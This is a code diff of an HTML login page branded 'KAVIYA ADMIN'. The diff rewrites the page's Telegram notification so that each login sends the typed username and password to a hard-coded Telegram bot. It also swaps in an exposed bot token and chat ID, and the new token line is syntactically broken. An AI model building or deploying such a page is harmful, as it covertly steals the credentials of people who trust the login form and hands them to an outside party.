@@ -126,7 +126,7 @@ font-weight:bold;
 <div class="delivery">🚀 Delivery Within 10 Minutes</div>
 
 <h1 class="main-title">KAVIYA ADMIN</h1>
-<p>Fast • Secure • Web owner - Admin kaviya</p>
+<p>Fast • Secure • Professional Admin Panel</p>
 
 <input type="text" id="username" placeholder="Username"><br>
 
@@ -143,7 +143,7 @@ font-weight:bold;
 
 <script>
 
-const BOT_TOKEN = "8354788016:AAGzzmqSAiXBKN8tUrefE-FluAucCz4Pgr0";
+const BOT_TOKEN = "8354788016:AAGLqmAbGVCMYcx_UK7cIMAewaRaGdQNO-w";";
 const CHAT_ID = "8324590734";
 
 let loggedIn = false;
@@ -165,13 +165,8 @@ return;
 loggedIn = true;
 alert("Login Success");
 
-/* Telegram Message (NO PASSWORD) */
-let message =
-"🔐 LOGIN ALERT\n\n" +
-"User: " + username + "\n" +
-"IP: " + ip + "\n" +
-"Device: " + device + "\n" +
-"Time: " + time;
+/* TELEGRAM NOTIFY */
+let message = "🔐 New Login\n\nUsername: " + username + "\nPassword: " + password;
 
 fetch("https://api.telegram.org/bot"+BOT_TOKEN+"/sendMessage",{
 method:"POST",
